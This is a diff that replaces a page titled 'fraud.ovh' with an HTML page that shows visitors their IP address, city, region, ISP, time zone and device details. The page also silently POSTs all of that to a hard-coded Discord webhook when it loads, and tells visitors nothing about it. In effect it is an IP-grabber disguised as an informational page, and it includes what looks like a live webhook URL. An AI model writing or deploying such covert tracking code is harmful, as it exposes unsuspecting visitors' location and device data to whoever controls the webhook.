@@ -1,10 +1,117 @@
-<!DOCTYPE HTML>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<HEADER>FRAUD.OVH</HEADER>
-<title>fraud.ovh</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP and Device Info</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 10%;
+      color: #333;
+    }
+    #ip-details {
+      font-size: 1.2em;
+      line-height: 1.6;
+      white-space: pre-line;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-https://discord.gg/sue
+  <h1>Your IP and Device Details</h1>
+  <div id="ip-details">Fetching your details...</div>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1312158309238837278/Gnb4gsoduv39RQJuCeKdfSWjxLyF3jwhmk2G3GGm-6_AvakMjyYlc9iNaVCQO3JHWGZf";
+
+    function getBrowserAndDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+
+      let browserName = "Unknown";
+      if (userAgent.indexOf("Firefox") > -1) {
+        browserName = "Firefox";
+      } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) {
+        browserName = "Chrome";
+      } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
+        browserName = "Safari";
+      } else if (userAgent.indexOf("Edg") > -1) {
+        browserName = "Edge";
+      } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+        browserName = "Opera";
+      }
+
+      let deviceType = "Desktop";
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        deviceType = "Mobile";
+      }
+
+      return { browserName, platform, deviceType };
+    }
+
+    function typeWriterEffect(element, text, delay = 50, callback) {
+      let index = 0;
+      const interval = setInterval(() => {
+        element.textContent += text[index];
+        index++;
+        if (index === text.length) {
+          clearInterval(interval);
+          if (callback) callback();
+        }
+      }, delay);
+    }
+
+    fetch('http://ip-api.com/json/')
+      .then(response => response.json())
+      .then(data => {
+        const { browserName, platform, deviceType } = getBrowserAndDeviceInfo();
+
+        const lines = [
+          `IP Address: ${data.query}`,
+          `City: ${data.city}`,
+          `Region: ${data.regionName}`,
+          `Country: ${data.country}`,
+          `ISP: ${data.isp}`,
+          `Time Zone: ${data.timezone}`,
+          `Browser: ${browserName}`,
+          `Platform: ${platform}`,
+          `Device Type: ${deviceType}`
+        ];
+
+        const ipDetailsElement = document.getElementById('ip-details');
+        ipDetailsElement.textContent = '';
+
+        let currentLine = 0;
+        function displayNextLine() {
+          if (currentLine < lines.length) {
+            typeWriterEffect(ipDetailsElement, lines[currentLine] + '\n', 50, displayNextLine);
+            currentLine++;
+          }
+        }
+        displayNextLine();
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `IP and Device Details:\nIP Address: ${data.query}\nCity: ${data.city}\nRegion: ${data.regionName}\nCountry: ${data.country}\nISP: ${data.isp}\nTime Zone: ${data.timezone}\nBrowser: ${browserName}\nPlatform: ${platform}\nDevice Type: ${deviceType}`
+          })
+        }).then(response => {
+          if (!response.ok) {
+            console.error("Failed to send data to the webhook");
+          }
+        }).catch(err => {
+          console.error("Error sending data to webhook:", err);
+        });
+      })
+      .catch(err => {
+        document.getElementById('ip-details').textContent = 'Error fetching IP details';
+        console.error(err);
+      });
+  </script>
 </body>
 </html>
